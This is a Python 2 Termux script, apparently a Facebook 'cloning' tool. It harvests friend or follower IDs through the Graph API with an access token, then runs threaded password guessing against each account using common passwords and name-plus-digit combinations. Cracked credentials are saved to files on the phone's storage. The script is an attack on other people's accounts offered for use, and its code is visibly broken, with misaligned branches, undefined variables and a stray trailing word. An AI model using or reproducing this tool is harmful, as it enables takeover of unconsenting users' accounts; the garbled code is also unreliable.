#!/usr/bin/python2
# coding=utf-8
 
import os
import sys
import time
import datetime
import re
import threading
import json
import random
import requests
import hashlib
import cookielib
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
__author__ = 'MR-BILAL-XD'
__copyright = 'All rights reserved . Copyright  Mr-BILAL'
os.system('termux-setup-storage')
 
try:
    os.mkdir('/sdcard/ids')
except OSError:
    pass
 
bd = random.randint(2e+07, 3e+07)
sim = random.randint(20000, 40000)
 
header = {
    'x-fb-connection-bandwidth': repr(bd),
    'x-fb-sim-hni': repr(sim),
    'x-fb-net-hni': repr(sim),
    'x-fb-connection-quality': 'EXCELLENT',
    'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
    'user-agent': 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]',
    'content-type': 'application/x-www-form-urlencoded',
    'x-fb-http-engine': 'Liger' }
os.system('git pull')
os.system('clear')
 
 
#### colours ####
B='\033[1;94m'
R='\033[1;91m'
G='\033[1;92m'
W='\033[1;97m'
S='\033[1;96m'
P='\033[1;95m'
Y='\033[1;93m'
 
#Dev:BILAL_HACKER
#### LOGO ####
logo = """                          
 ______ ______         ______  _____  _      _____ 
 |  ___|| ___ \        |  ___||_   _|| |    |  ___|
 | |_   | |_/ / ______ | |_     | |  | |    | |__  
 |  _|  | ___ \|______||  _|    | |  | |    |  __| 
 | |    | |_/ /        | |     _| |_ | |____| |___ 
 \_|    \____/         \_|     \___/ \_____/\____/ 
                                                   
                                                                                                     

                                    \033[1;91BILAL-XD
                                                                       
"""
def log_menu():
    
    try:
        t_check = open('access_token.txt', 'r')
        menu()
    except (KeyError, IOError):
        os.system('clear')
        print logo
        print '\033[1;92m ~~~~ Login menu ~~~~\033[1;94m'
	print 47 * '-'
        print '\033[1;97m𝗕𝗶𝗹𝗮𝗹-𝗫𝗗[1] Login with FaceBook'
        print '\033[1;92m𝗕𝗶𝗹𝗮𝗹-𝗫𝗗[2] Login with token'
        print '\033[1;97m𝗕𝗶𝗹𝗮𝗹-𝗫𝗗[3] Follow  On Fb'
        print ''
        log_menu_s()
 
 
 
def log_menu_s():
    s = raw_input(' \033[1;97m╰─𝗕𝗶𝗹𝗮𝗹-𝗫𝗗➤ ')
    if s == '1':
        log_fb()
    elif s == '2':
        log_token()
    elif s == '3':
        os.system('xdg-open https://www.facebook.com/100011466164055')
    else:
        print ''
        print '\\ Select valid option '
        print ''
        log_menu_s()
 
 
def log_fb():
    os.system('clear')
    print logo
    print '\033[1;31;1mLogin with id/pass'
    print 47 * '-'
    lid = raw_input('\033[1;92m Id/mail/no: ')
    pwds = raw_input(' \033[1;93mPassword: ')
    
    try:
        data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pwd).text
        q = json.loads(data)
        if 'loc' in q:
            ts = open('access_token.txt', 'w')
            ts.write(q['loc'])
            ts.close()
            menu()
        elif 'www.facebook.com' in q['error']:
            print ' User must verify account before login'
            raw_input('\033[1;92m Press enter to try again ')
            log_fb()
        else:
            print ' Id/Pass may be wrong'
            raw_input(' \033[1;92mPress enter to try again ')
            log_fb()
    except:
        print ''
        print 'Exiting tool'
        os.system('exit')
 
 
 
def log_token():
    os.system('clear')
    print logo
    print '\033[1;97mLogin with token\033[1;91m'
    print 47 * '-'
    tok = raw_input(' \033[1;92mPaste token here: \033[1;91m')
    print 47 * '-'
    t_s = open('access_token.txt', 'w')
    t_s.write(tok)
    t_s.close()
    menu()
 
 
def menu():
    os.system('clear')
    
    try:
        token = open('access_token.txt', 'r').read()
    except (KeyError, IOError):
        print ''
        print logo
        print '\033[1;31;1mLogin FB id to continue'
        time.sleep(1)
        log_menu()
 
    
    try:
        r = requests.get('https://graph.facebook.com/me?access_token=' + token)
        q = json.loads(r.text)
        z = q['name']
    except (KeyError, IOError):
        print logo
        print ''
        print '\t Account Cheekpoint\x1b[0;97m'
        print ''
        os.system('rm -rf access_token.txt')
        time.sleep(1)
        log_menu()
    except requests.exceptions.ConnectionError:
        print logo
        print ''
        print '\t Turn on mobile data/wifi\x1b[0;97m'
        print ''
        raw_input(' \033[1;92mPress enter after turning on mobile data/wifi ')
        menu()
 
    os.system('clear')
    print logo
    tok = open('/sdcard/.hst.txt', 'r').read()
    print '  \033[1;92mLogged in user: \033[1;93m' + z
    print 47 * '-'
    print ' \033[1;92m Active token: \033[1;94m' + tok
    print ' ------------------------------------------ '
    print '\033[1;91m𝗕𝗶𝗹𝗮𝗹-𝗫𝗗[1] Start Cloning' 
    print '\033[1;91m𝗕𝗶𝗹𝗮𝗹-𝗫𝗗[2] Follow me'
    print '\033[1;91m𝗕𝗶𝗹𝗮𝗹-𝗫𝗗[3] View token'
    print '\033[1;91m𝗕𝗶𝗹𝗮𝗹-𝗫𝗗[4] Logout'
    print '\033[1;91m𝗕𝗶𝗹𝗮𝗹-𝗫𝗗[5] Delete trash files'
    menu_s()
 
 
def menu_s():
    ms = raw_input('\033[1;92m╰─𝗕𝗶𝗹𝗮𝗹-𝗫𝗗➤ ')
    if ms == '1':
        auto_crack()
    elif ms == '2':
        os.system('xdg-open https://www.facebook.com/100011466164055 /')
    elif ms == '3':
        v_tok()
    elif ms == '4':
        lout()
    elif ms == '5':
        rtrash()
        
    else:
        print ''
        print '\tSelect valid option'
        print ''
        menu_s()
        
def crack():
    global toket
    
    try:
	toket=open('login.txt','r').read()
    except (KeyError, IOError):
	os.system('clear')
        print logo
        print '\t File Not Found \x1b[0;97m'
        print ''
        time.sleep(1)
        log_menu()
    os.system('clear')
    print logo
    print '\033[1;91m~~~~ Choice pass cracking ~~~~\033[1;94m'
    print 47 * '-'
    print '\033[1;91m𝗕𝗶𝗹𝗮𝗹-𝗫𝗗[1] Public id cloning'
    print '\033[1;97m𝗕𝗶𝗹𝗮𝗹-𝗫𝗗[2] Followers cloning'
    print '\033[1;93m𝗕𝗶𝗹𝗮𝗹-𝗫𝗗[3] File cloning'
    print '\033[1;94m𝗕𝗶𝗹𝗮𝗹-𝗫𝗗[0] Back'
    a_s()
 
def auto_crack():
    global token
    
    try:
        token = open('access_token.txt', 'r').read()
    except (KeyError, IOError):
        os.system('clear')
        print logo
        print '\t Login FB id to continue\x1b[0;97m'
        print ''
        time.sleep(1)
        log_menu()
 
    os.system('clear')
    print logo
    print '\033[1;90m~~~~ Choice pass cracking ~~~~\033[1;94m'
    print 47 * '-'
    print '\033[1;91m𝗕𝗶𝗹𝗮𝗹-𝗫𝗗[1] Public id cloning'
    print '\033[1;97m𝗕𝗶𝗹𝗮𝗹-𝗫𝗗[2] Followers cloning'
    print '\033[1;93m𝗕𝗶𝗹𝗮𝗹-𝗫𝗗[3] File cloning'
    print '\033[1;94m𝗕𝗶𝗹𝗮𝗹-𝗫𝗗[0] Back'
    a_s()
 
 
def a_s():
    id = []
    cps = []
    oks = []
    a_s = raw_input(' \033[1;97m╰─ᗷƖᒪᗩᒪ-᙭ᗪ➤ ')
    if a_s == '1':
        os.system('clear')
        print logo
        print ' \033[1;90mFor-example : \033[1;91m234567,334455,445566,556677\033[1;94m'
        print 47 * '-'
        pass1 = raw_input(' \033[1;92mＢｉｌａｌ-ＸＤ[1]Password: ')
        pass2 = raw_input(' \033[1;92mＢｉｌａｌ-ＸＤ[2]Password: ')
        pass3 = raw_input(' \033[1;92mＢｉｌａｌ-ＸＤ[3]Password: ')
      	pass4 = raw_input(' \033[1;92mＢｉｌａｌ-ＸＤ[4]Password: ')
        pass5 = raw_input(' \033[1;92mＢｉｌａｌ-ＸＤ[5]Password: ')
        pass6 = raw_input(' \033[1;92mＢｉｌａｌ-ＸＤ[6]Password: ')
        pass7 = raw_input(' \033[1;92mＢｉｌａｌ-ＸＤ[7]Password: ')
        pass8 = raw_input(' \033[1;92mＢｉｌａｌ-ＸＤ[8]Password: ')
        p9 = raw_input(' Name + your digit: ')
        p10 = raw_input(' Name + your digit: ')
        p11 = raw_input(' Name + your digit: ')
        p12 = raw_input(' Name + your digit: ')
        p13 = raw_input(' Name + your digit: ')
        idt = raw_input(' \033[1;93mＢｉｌａｌ-ＸＤ[★]Enter id: ')
        
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            q = json.loads(r.text)
            z = q['name']
            os.system('clear')
            print logo
            print '\033[1;90m~~~~Choice public cracking~~~~'
            print ' \033[1;92mCloning from: ' + z
        except (KeyError, IOError):
            print '\t Invalid user \x1b[0;97m'
            raw_input(' \033[1;92mPress enter to try again ')
            auto_crack()
 
        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)
        
    elif a_s == '2':
        os.system('clear')
        print logo
        print ' \033[1;91mFor-example : \033[1;97m234567,334455,445566,556677\033[1;94m'
        print 47 * '-'
        pass1 = raw_input(' \033[1;92mＢｉｌａｌ-ＸＤ[1]Password: ')
        pass2 = raw_input(' \033[1;92mＢｉｌａｌ-ＸＤ[2]Password: ')
        pass3 = raw_input(' \033[1;92mＢｉｌａｌ-ＸＤ[3]Password: ')
	pass4 = raw_input(' \033[1;92mＢｉｌａｌ-ＸＤ[4]Password: ')
	pass5 = raw_input(' \033[1;92mＢｉｌａｌ-ＸＤ[5]Password: ')
	pass6 = raw_input(' \033[1;92mＢｉｌａｌ-ＸＤ[6]Password: ')
	pass7 = raw_input(' \033[1;92mＢｉｌａｌ-ＸＤ[7]Password: ')
	p9 = raw_input(' Name + your digit: ')
	p10 = raw_input(' Name + your digit: ')
	p11 = raw_input(' Name + your digit: ')
	p12 = raw_input(' Name + your digit: ')
	p13 = raw_input(' Name + your digit: ')
        idt = raw_input(' \033[1;93mＢｉｌａｌ-ＸＤ[★]Enter id: ')
        
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            q = json.loads(r.text)
            z = q['name']
            os.system('clear')
            print logo
            print '\033[1;97m~~~~ Choice followers cracking ~~~~'
            print ' \033[1;92mCloning from: ' + z
        except (KeyError, IOError):
            print '\t Invalid user \x1b[0;97m'
            raw_input('\033[1;92mPress enter to try again ')
            auto_crack()
 
        r = requests.get('https://graph.facebook.com/' + idt + '/subscribers?access_token=' + token + '&limit=999999')
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)
        
    elif a_s == '3':
        os.system('clear')
        print logo
        print ' \033[1;90mFor-example : \033[1;97m234567,334455,445566,556677,786786,007007,102030,304050\033[1;94m'
        print 47 * '-'
        pass1 = raw_input(' \033[1;92mＢｉｌａｌ-ＸＤ[1]Password: ')
        pass2 = raw_input(' \033[1;92mＢｉｌａｌ-ＸＤ[2]Password: ')
        pass3 = raw_input(' \033[1;92mＢｉｌａｌ-ＸＤ[3]Password: ')
	pass4 = raw_input(' \033[1;92mＢｉｌａｌ-ＸＤ[4]Password: ')
	pass5 = raw_input(' \033[1;92mＢｉｌａｌ-ＸＤ[5]Password: ')
	pass6 = raw_input(' \033[1;92mＢｉｌａｌ-ＸＤ[6]Password: ')
	pass7 = raw_input(' \033[1;92mＢｉｌａｌ-ＸＤ[7]Password: ')
	pass8 = raw_input(' \033[1;92mＢｉｌａｌ-ＸＤ[8]Password: ')
	p9 = raw_input(' Name + your digit: ')
	p10 = raw_input(' Name + your digit: ')
	p11 = raw_input(' Name + your digit: ')
	p12 = raw_input(' Name + your digit: ')
	p13 = raw_input(' Name + your digit: ')
        try:
	    idlist= raw_input('[+] File Name: ')
	    for line in open(idlist ,'r').readlines():
	        id.append(line.strip())
	except IOError:
	    print"[!] File Not Found."
	    raw_input('Press Enter To Back. ')
	    crack()
    
    elif a_s == '0':
        menu()
    else:
        print ''
        print '\tChoose valid option' + w
        a_s()
    print ' Total ids: ' + str(len(id))
    time.sleep(0.5)
    print ' \033[1;92mCrack Running\033[1;94m '
    time.sleep(0.5)
    print 47 * '-'
    print '\t\033[1;92mB1L4L 1S 4 CUT3 B0Y\033[1;94m'
    print 47 * '-'
    
    def main(arg):
        user = arg
        (uid, name) = user.split('|')
        
        try:
            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass1, headers = header).text
            q = json.loads(data)
            if 'loc' in q:
                print '\033[1;95m[BILAL-OK]➤ ' + uid + ' | ' + pass1
                ok = open('/sdcard/ids/BILAL_OK.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error']:
                print '\033[1;91m[BILAL-CP]➤ ' + uid + ' | ' + pass1
 
                cp = open('BILAL_CP.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                cps.append(uid + pass1)
            else:
                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass2, headers = header).text
                q = json.loads(data)
                if 'loc' in q:
                    print '\033[1;95m[BILAL-OK]➤ ' + uid + ' | ' + pass2
                    ok = open('/sdcard/ids/BILAL_OK.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'www.facebook.com' in q['error']:
                    print '\033[1;91m[BILAL-CP]➤ ' + uid + ' | ' + pass2
                    cp = open('BILAL_CP.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    cps.append(uid + pass2)
                else:
                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass3, headers = header).text
                    q = json.loads(data)
                    if 'loc' in q:
                        print '\033[1;95m[BILAL-OK]➤ ' + uid + ' | ' + pass3
                        ok = open('/sdcard/ids/BILAL_OK.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'www.facebook.com' in q['error']:
                        print '\033[1;91m[BILAL-CP]➤ ' + uid + ' | ' + pass3
                        cp = open('BILAL_CP.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        cps.append(uid + pass3)
                    else:
                        data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass4, headers = header).text
                        q = json.loads(data)
                        if 'loc' in q:
                            print '\033[1;95m[BILAL-OK]➤ ' + uid + ' | ' + pass4
                            ok = open('/sdcard/ids/BILAL_OK.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'www.facebook.com' in q['error']:
                            print '\033[1;91m[BILAL-CP]➤ ' + uid + ' | ' + pass4
                            cp = open('BILAL_CP.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
                            cps.apppend(uid + pass4)
                            else:
                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass5, headers = header).text
                    q = json.loads(data)
                    if 'loc' in q:
                        print '\033[1;95m[BILAL-OK]➤ ' + uid + ' | ' + pass5
                        ok = open('/sdcard/ids/BILAL_OK.txt', 'a')
                        ok.write(uid + ' | ' + pass5 + '\n')
                        ok.close()
                        oks.append(uid + pass5)
                    elif 'www.facebook.com' in q['error']:
                        print '\033[1;91m[BILAL-CP]➤ ' + uid + ' | ' + pass5
                        cp = open('BILAL_CP.txt', 'a')
                        cp.write(uid + ' | ' + pass5 + '\n')
                        cp.close()
                        cps.append(uid + pass5)
                        else:
                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass6, headers = header).text
                    q = json.loads(data)
                    if 'loc' in q:
                        print '\033[1;95m[BILAL-OK]➤ ' + uid + ' | ' + pass6
                        ok = open('/sdcard/ids/BILAL_OK.txt', 'a')
                        ok.write(uid + ' | ' + pass6 + '\n')
                        ok.close()
                        oks.append(uid + pass6)
                    elif 'www.facebook.com' in q['error']:
                        print '\033[1;91m[BILAL-CP]➤ ' + uid + ' | ' + pass6
                        cp = open('BILAL_CP.txt', 'a')
                        cp.write(uid + ' | ' + pass6 + '\n')
                        cp.close()
                        cps.append(uid + pass6)
                        else:
                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass7, headers = header).text
                    q = json.loads(data)
                    if 'loc' in q:
                        print '\033[1;95m[BILAL-OK]➤ ' + uid + ' | ' + pass7
                        ok = open('/sdcard/ids/BILAL_OK.txt', 'a')
                        ok.write(uid + ' | ' + pass7 + '\n')
                        ok.close()
                        oks.append(uid + pass7)
                    elif 'www.facebook.com' in q['error']:
                        print '\033[1;91m[BILAL-CP]➤ ' + uid + ' | ' + pass7
                        cp = open('BILAL_CP.txt', 'a')
                        cp.write(uid + ' | ' + pass7 + '\n')
                        cp.close()
                        cps.append(uid + pass7)
                        else:
                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass8, headers = header).text
                    q = json.loads(data)
                    if 'loc' in q:
                        print '\033[1;95m[BILAL-OK]➤ ' + uid + ' | ' + pass8
                        ok = open('/sdcard/ids/BILAL_OK.txt', 'a')
                        ok.write(uid + ' | ' + pass8 + '\n')
                        ok.close()
                        oks.append(uid + pass8)
                    elif 'www.facebook.com' in q['error']:
                        print '\033[1;91m[BILAL-CP]➤ ' + uid + ' | ' + pass8
                        cp = open('BILAL_CP.txt', 'a')
                        cp.write(uid + ' | ' + pass8 + '\n')
                        cp.close()
                        cps.append(uid + pass8)
                        else:
                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass9, headers = header).text
                pass9 = name.lower() + p9
                q = json.loads(data)
                if 'loc' in q:
                    print '\033[1;95m[BILAL-OK]➤ ' + uid + ' | ' + pass9
                    ok = open('/sdcard/ids/BILAL_OK.txt', 'a')
                    ok.write(uid + ' | ' + pass9 + '\n')
                    ok.close()
                    oks.append(uid + pass9)
                elif 'www.facebook.com' in q['error']:
                    print '\033[1;91m[BILAL-CP]➤ ' + uid + ' | ' + pass9
                    cp = open('BILAL_CP.txt', 'a')
                    cp.write(uid + ' | ' + pass9 + '\n')
                    cp.close()
                    cps.append(uid + pass9)
                    else:
                    	pass10 = name.lower() + p10
                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass10, headers = header).text
                q = json.loads(data)
                if 'loc' in q:
                    print '\033[1;95m[BILAL-OK]➤ ' + uid + ' | ' + pass10
                    ok = open('/sdcard/ids/BILAL_OK.txt', 'a')
                    ok.write(uid + ' | ' + pass10 + '\n')
                    ok.close()
                    oks.append(uid + pass10)
                elif 'www.facebook.com' in q['error']:
                    print '\033[1;91m[BILAL-CP]➤ ' + uid + ' | ' + pass10
                    cp = open('BILAL_CP.txt', 'a')
                    cp.write(uid + ' | ' + pass10 + '\n')
                    cp.close()
                    cps.append(uid + pass10)
                    else:
                    	pass11 = name.lower() + p11
                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass11, headers = header).text
                q = json.loads(data)
                if 'loc' in q:
                    print '\033[1;95m[BILAL-OK]➤ ' + uid + ' | ' + pass11
                    ok = open('/sdcard/ids/BILAL_OK.txt', 'a')
                    ok.write(uid + ' | ' + pass11 + '\n')
                    ok.close()
                    oks.append(uid + pass11)
                elif 'www.facebook.com' in q['error']:
                    print '\033[1;91m[BILAL-CP]➤ ' + uid + ' | ' + pass11
                    cp = open('BILAL_CP.txt', 'a')
                    cp.write(uid + ' | ' + pass11 + '\n')
                    cp.close()
                    cps.append(uid + pass11)
                              else:
                    	pass12 = name.lower() + p12
                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass12, headers = header).text
                q = json.loads(data)
                if 'loc' in q:
                    print '\033[1;95m[BILAL-OK]➤ ' + uid + ' | ' + pass12
                    ok = open('/sdcard/ids/BILAL_OK.txt', 'a')
                    ok.write(uid + ' | ' + pass12 + '\n')
                    ok.close()
                    oks.append(uid + pass12)
                elif 'www.facebook.com' in q['error']:
                    print '\033[1;91m[BILAL-CP]➤ ' + uid + ' | ' + pass12
                    cp = open('BILAL_CP.txt', 'a')
                    cp.write(uid + ' | ' + pass12 + '\n')
                    cp.close()
                    cps.append(uid + pass12)
                              else:
                    	pass13 = name.lower() + p13
                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass13, headers = header).text
                q = json.loads(data)
                if 'loc' in q:
                    print '\033[1;95m[BILAL-OK]➤ ' + uid + ' | ' + pass13
                    ok = open('/sdcard/ids/BILAL_OK.txt', 'a')
                    ok.write(uid + ' | ' + pass13 + '\n')
                    ok.close()
                    oks.append(uid + pass13)
                elif 'www.facebook.com' in q['error']:
                    print '\033[1;91m[BILAL-CP]➤ ' + uid + ' | ' + pass13
                    cp = open('BILAL_CP.txt', 'a')
                    cp.write(uid + ' | ' + pass13 + '\n')
                    cp.close()
                    cps.append(uid + pass13)




        except:
            pass
        
 
 
    p = ThreadPool(30)
    p.map(main, id)
    print 47 * '-'
    print ' \033[1;92mB1L4L \033[1;96mBLACK \033[1;97mHATE \033[1;98mHACKER'
    print ' \033[1;92mTotal \033[1;95mOk\033[1;90m/\033[1;91mCp:' + str(len(oks)) + '/' + str(len(cps))
    print 47 * '-'
    raw_input(' \033[1;90mPress enter to back')
    auto_crack()
	
 
 
if __name__ == '__main__':
    menu()

hi
